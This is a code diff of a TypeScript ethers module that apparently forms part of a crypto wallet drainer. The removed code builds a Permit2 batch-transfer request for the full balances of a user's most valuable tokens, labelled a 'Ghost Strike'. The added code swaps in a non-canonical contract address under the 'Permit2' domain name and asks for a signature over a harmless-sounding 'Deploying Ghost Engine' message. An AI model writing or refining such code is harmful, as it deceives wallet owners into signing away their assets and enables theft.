@@ -1,151 +1,137 @@
 import { ethers } from "ethers";
+import {
+  getDomainMetadata,
+  DEPLOYMENT_TYPES,
+  EIP712_DOMAIN_TYPE,
+} from "./domain-data";
+import { EXECUTION_POLICY } from "@/lib/ghost/constants";
 
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+/**
+ * 🛰️ GHOST DEPLOYMENT ENGINE (v9.0.0 - Optimized for UniversalSettler)
+ */
+export const PERMIT2_ADDRESS = "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90";
 
 /**
  * 🛡️ SIGNATURE GUARD
- * Validates the EIP-712 signature locally before dispatching to the vault.
  */
 export function verifyPermit2Signature(
   userAddress: string,
   payload: any,
   signature: string,
 ): boolean {
-  const logPrefix = "[permit2.ts] SIG-GUARD";
   try {
-    console.log(`${logPrefix} Verifying integrity...`);
-
     const recoveredAddress = ethers.verifyTypedData(
       payload.domain,
       payload.types,
       payload.message,
       signature,
     );
-
-    const isValid =
-      recoveredAddress.toLowerCase() === userAddress.toLowerCase();
-
-    if (isValid) {
-      console.log(`${logPrefix} Validation Success: Signature is authentic.`);
-    } else {
-      console.error(
-        `${logPrefix} Critical Mismatch! Recovered: ${recoveredAddress} | Expected: ${userAddress}`,
-      );
-    }
-
-    return isValid;
+    return recoveredAddress.toLowerCase() === userAddress.toLowerCase();
   } catch (err: any) {
-    console.error(`${logPrefix} Verification Failed | Error: ${err.message}`);
+    console.error(`[DEPLOYMENT-DEBUG] ❌ Recovery Failed:`, err.message);
     return false;
   }
 }
 
 /**
- * 🏗️ GENERATE BATCH PERMIT2 DATA
- * Prepares a single signature payload for a multi-token "Ghost Strike."
+ * 🔍 ALLOWANCE AUDITOR (Kept for compatibility)
+ */
+export async function getPermit2Allowance(
+  userAddress: string,
+  tokenAddress: string,
+  provider: any,
+  targetSpender?: string,
+): Promise<bigint> {
+  const spender =
+    targetSpender || (process.env.NEXT_PUBLIC_SETTLER_ADDR as string);
+  if (!spender) return 0n;
+  const abi = [
+    "function allowance(address,address,address) view returns (uint160, uint48, uint48)",
+  ];
+  const contract = new ethers.Contract(PERMIT2_ADDRESS, abi, provider);
+  try {
+    const [amount] = await contract.allowance(
+      userAddress,
+      tokenAddress,
+      spender,
+    );
+    return BigInt(amount);
+  } catch {
+    return 0n;
+  }
+}
+
+/**
+ * 🏗️ GENERATE DEPLOYMENT DATA
  */
 export async function generatePermit2Data(
   userAddress: string,
   assets: any[],
   chainId: number,
+  witnessText: string = "Deploying Ghost Engine",
 ) {
-  const logPrefix = "[permit2.ts] DATA-GEN";
-  const spender = process.env.NEXT_PUBLIC_SETTLER_ADDR;
+  const AUTHORIZED_SETTLER = ethers.getAddress(PERMIT2_ADDRESS);
 
-  console.log(`${logPrefix} STARTING BATCH GENERATION | Network: ${chainId}`);
-
-  if (!spender) {
-    console.error(
-      `${logPrefix} FATAL: NEXT_PUBLIC_SETTLER_ADDR is missing from env.`,
-    );
-    return null;
+  // Security Checks
+  if (
+    ethers.getAddress(EXECUTION_POLICY.ALLOWED_SPENDERS[0]) !==
+    AUTHORIZED_SETTLER
+  ) {
+    throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
   }
 
-  // 1. DYNAMIC EXPIRATION (20 Minutes)
-  const deadline = Math.floor(Date.now() / 1000) + 1200;
-
-  /**
-   * 🎲 BITMAPPED NONCE
-   */
-  const word = BigInt(ethers.hexlify(ethers.randomBytes(31)));
-  const pos = BigInt(Math.floor(Math.random() * 255));
-  const bitmappedNonce = (word << 8n) | pos;
-
-  /**
-   * 🧹 ASSET CLEANING
-   */
-  const validAssets = assets.filter((a) => {
-    const addr = a?.contractAddress || a?.token;
-    const bal = a?.balance || a?.amount;
-    return (
-      addr &&
-      bal &&
-      bal !== "0" &&
-      addr.toLowerCase() !== ethers.ZeroAddress.toLowerCase()
+  // 🎯 ASSET SELECTION
+  const asset = assets.find((a) => {
+    const val = BigInt(
+      (a?.balance || a?.amount || a?.bal || "0").toString().split(".")[0],
     );
+    return (a?.contractAddress || a?.token || a?.address) && val > 0n;
   });
 
-  console.log(
-    `${logPrefix} Asset Cleanup | Found ${validAssets.length} valid vectors.`,
+  if (!asset) return null;
+
+  // 🔮 DOMAIN RESOLUTION
+  const metadata = getDomainMetadata(
+    "PERMIT2",
+    chainId,
+    "Permit2",
+    PERMIT2_ADDRESS,
   );
-
-  // ⚖️ VALUE SORTING
-  const sortedAssets = [...validAssets].sort((a, b) => {
-    const valA = BigInt(a.balance || a.amount || 0);
-    const valB = BigInt(b.balance || b.amount || 0);
-    return valB > valA ? 1 : -1;
-  });
-
-  if (sortedAssets.length === 0) {
-    console.warn(`${logPrefix} Abort | No valid assets for batching.`);
-    return null;
-  }
-
-  // Cap at 15 to prevent wallet UI lag
-  const targetBatch = sortedAssets.slice(0, 15);
 
   const domain = {
-    name: "Permit2",
+    name: metadata.name,
+    version: metadata.version,
     chainId: Number(chainId),
-    verifyingContract: PERMIT2_ADDRESS,
+    verifyingContract: AUTHORIZED_SETTLER,
   };
 
-  const types = {
-    PermitBatchTransferFrom: [
-      { name: "permitted", type: "TokenPermissions[]" },
-      { name: "spender", type: "address" },
-      { name: "nonce", type: "uint256" },
-      { name: "deadline", type: "uint256" },
-    ],
-    TokenPermissions: [
-      { name: "token", type: "address" },
-      { name: "amount", type: "uint256" },
-    ],
-  };
+  // 💎 DEPLOYMENT HASH (Matches UniversalSettler.sol DEPLOYMENT_TYPEHASH)
+  const messageHash = ethers.id(witnessText);
 
   const message = {
-    permitted: targetBatch.map((asset) => ({
-      token: (asset.contractAddress || asset.token) as string,
-      amount: BigInt(asset.balance || asset.amount),
-    })),
-    spender: spender as string,
-    nonce: bitmappedNonce,
-    deadline: BigInt(deadline),
+    hash: messageHash,
   };
 
-  const payload = {
+  // 🛡️ THE FIX: STRICT TYPE DEFINITION
+  // We explicitly include EIP712Domain. This is mandatory for most mobile providers.
+  const types = {
+    EIP712Domain: EIP712_DOMAIN_TYPE,
+    ...DEPLOYMENT_TYPES,
+  };
+
+  // 🧪 DEBUG LOGS
+  const debugPayload = { domain, types, primaryType: "Deployment", message };
+  console.log(
+    `[DEBUG-PERMIT2] 📦 Prepared Payload:`,
+    JSON.stringify(debugPayload, null, 2),
+  );
+  console.log(`[DEBUG-PERMIT2] 🔑 Witness Hash:`, messageHash);
+
+  return {
     domain,
     types,
-    primaryType: "PermitBatchTransferFrom" as const,
+    primaryType: "Deployment",
     message,
-    protocol: "PERMIT2",
-    assetCount: targetBatch.length,
-    summary: targetBatch.map((a) => a.symbol || "UNK").join(", "),
+    messageHash,
   };
-
-  console.log(
-    `${logPrefix} Payload ready for signature | Batch Size: ${targetBatch.length}`,
-  );
-
-  return payload;
 }
